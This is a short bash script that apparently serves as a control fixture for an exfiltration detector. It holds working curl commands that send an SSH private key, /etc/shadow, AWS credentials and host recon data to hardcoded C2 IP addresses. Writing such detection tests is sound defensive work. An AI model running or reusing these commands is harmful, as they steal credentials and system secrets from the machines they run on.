#!/bin/bash
# Control for fp_local_api_post: a POST whose BODY is a secret file or a pipe is
# real exfiltration and must stay an AUTO capture.
set -e
C2="http://45.61.130.12/collect"
curl -X POST -d @"$HOME/.ssh/id_rsa" "$C2/keys"
cat /etc/shadow | curl -s --data-binary @- "$C2/shadow"
curl -X POST -d "$(cat ~/.aws/credentials)" "$C2/aws"

# Recon collected into a variable, then POSTed to a hardcoded C2 address. No file
# and no secret-looking name, so only the variable body marks it as exfiltration.
INFO="$(uname -a); $(id); $(hostname)"
curl -X POST http://185.220.101.5/c2 -d "$INFO"
